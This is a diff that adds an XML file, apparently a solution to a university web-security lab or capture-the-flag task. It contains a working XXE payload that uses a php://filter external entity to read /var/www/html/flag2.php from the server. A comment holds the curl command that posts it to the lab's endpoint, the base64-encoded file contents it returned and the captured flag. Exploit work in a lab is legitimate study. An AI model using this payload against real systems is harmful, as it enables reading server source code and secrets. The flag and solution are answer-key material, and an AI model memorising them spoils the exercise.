@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag2.php">
+]>
+<auth>
+  <login>&xxe;</login>
+  <password>password</password>
+</auth>
+
+<!--curl -X POST "https://2b679516-4508-4c70-8037-b42fa10e97be-api.web.lms.itmo.xyz/demo1.php" -H "Content-Type: application/xml" __data-binary @xxe_flag2.xml
+
+PD9waHAgI0ZsYWdfMiA9IGRiZWIxYzg4Yjk5NTgwMGEwMjg4ODdiMzE4YTJlODc0MGQ1ZWRjZTMwODdmMjQzYWRmYmZmY2U1MWE5ZWFhOTE1YWJjN2RmYzQwYjIK
+
+#Flag_2 = dbeb1c88b995800a028887b318a2e8740d5edce3087f243adfbffce51a9eaa915abc7dfc40b2
+-->
